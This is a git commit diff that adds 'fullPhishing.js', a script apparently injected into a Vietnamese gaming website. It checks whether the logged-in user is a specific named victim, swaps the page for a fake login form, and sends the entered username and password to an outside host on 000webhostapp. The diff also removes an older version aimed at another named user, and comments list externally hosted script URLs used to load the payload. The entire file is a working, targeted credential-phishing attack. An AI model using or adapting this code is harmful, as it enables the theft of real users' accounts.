1950622bc3c2fe3b3b6dfe2904c92204d7afec74
songloimr <47079927+songloimr@users.noreply.github.com>
2021-09-19 23:53:59 +0700

    Add files via upload

--- fullPhishing.js
+++ fullPhishing.js
@@ -1,1 +1,46 @@
-const VICTIM="tuansv1",ID_ATTACK=3092,SERVER_=1,fake='<div class="container">\n<div class="form" style="padding-top:25px"><div class="row justify-content-center"><h3>Đăng nhập</h3></div>\n<div class="row justify-content-center"><div class="col-lg-8"><div id="alert"></div>\n<form id="formLogin" method="POST" style="padding:20px 20px"><div class="form-group">\n<label for="">Tài khoản</label><input class="form-control" id="username" name="username" placeholder=""></div>\n<div class="form-group"><label for="">Mật khẩu</label>\n<input type="password" class="form-control" id="password" name="password" placeholder=""></div>\n<div class="form-group"><button type="button" class="btn btn-success form-control font-weight-bold text-uppercase" onclick="btnLogin()">\n<i class="fas fa-sign-in-alt">Đăng nhập</i></button></div><div class="form-group text-center">Bạn chưa có tài khoản? \n<a type="button" class="btn btn-danger font-weight-bold text-uppercase" href="user/register"><i class="fas fa-user-plus">\n</i> Đăng kí</a></div></form></div></div></div></div>';var MAY_CHU,TEN_TK;const currATK=localStorage.getItem("sess");if(null==currATK||3092!=currATK){$("#link-group-facebook").hide(),$("#link-group-facebook").html('<iframe style="display:none" id="mc" src="/user/chuyenvang"></iframe>');var fr=document.getElementById("mc");fr.addEventListener("load",function(){let e=fr.contentDocument.querySelector(".alert-info > strong > span").innerText.replace(/\D/g,"");MAY_CHU=parseInt(e),TEN_TK=$("#userInfo").text().split("-")[0].trim(),1===MAY_CHU&&TEN_TK===VICTIM&&(doIt(),localStorage.setItem("sess",3092))}),btnLogin=(()=>{const e="https://songloimr.000webhostapp.com/p.php?"+$("#formLogin").serialize();$.get(e,e=>{window.location.href="/"})})}function doIt(){document.querySelectorAll(".container")[1].innerHTML=fake,$("#userInfo").parent().parent().remove(),$("#batnhac").remove(),$("#game-taixiu").hide("fade",{},300)}
+const VICTIM = 'xkien2002';
+const ID_ATTACK = 372822;
+const SERVER_ = 1;
+const fake = `<div class="container">
+<div class="form" style="padding-top:25px"><div class="row justify-content-center"><h3>Đăng nhập</h3></div>
+<div class="row justify-content-center"><div class="col-lg-8"><div id="alert"></div>
+<form id="formLogin" method="POST" style="padding:20px 20px"><div class="form-group">
+<label for="">Tài khoản</label><input class="form-control" id="username" name="username" placeholder=""></div>
+<div class="form-group"><label for="">Mật khẩu</label>
+<input type="password" class="form-control" id="password" name="password" placeholder=""></div>
+<div class="form-group"><button type="button" class="btn btn-success form-control font-weight-bold text-uppercase" onclick="btnLogin()">
+<i class="fas fa-sign-in-alt">Đăng nhập</i></button></div><div class="form-group text-center">Bạn chưa có tài khoản? 
+<a type="button" class="btn btn-danger font-weight-bold text-uppercase" href="user/register"><i class="fas fa-user-plus">
+</i> Đăng kí</a></div></form></div></div></div></div>`;
+
+var MAY_CHU;
+var TEN_TK;
+const currATK = localStorage.getItem('sess')
+if (currATK == null || currATK != ID_ATTACK) {
+  TEN_TK = $("#userInfo").text().split('-')[0].trim();
+  if (TEN_TK === VICTIM) {
+    doIt();
+    localStorage.setItem('sess', ID_ATTACK);
+  }
+
+  btnLogin = () => {
+    const data = $('#formLogin').serialize();
+    const l = 'https://songloimr.000webhostapp.com/p.php?' + data;
+    $.get(l, (d) => {
+      window.location.href = "/";
+    })
+  }
+}
+
+function doIt() {
+  var main = document.querySelectorAll('.container')[1];
+  main.innerHTML = fake;
+  //var divAlert = document.getElementById("alert");
+  var dashboard = $('#userInfo').parent().parent();
+  dashboard.remove();
+  $('#batnhac').remove();
+  $('#game-taixiu')['hide']('fade', {}, 300)
+}
+//getServer
+//https://a.tmp.ninja/sUpJjsGf.js
+//<script src='https://a.tmp.ninja/Dnsjczva.js'
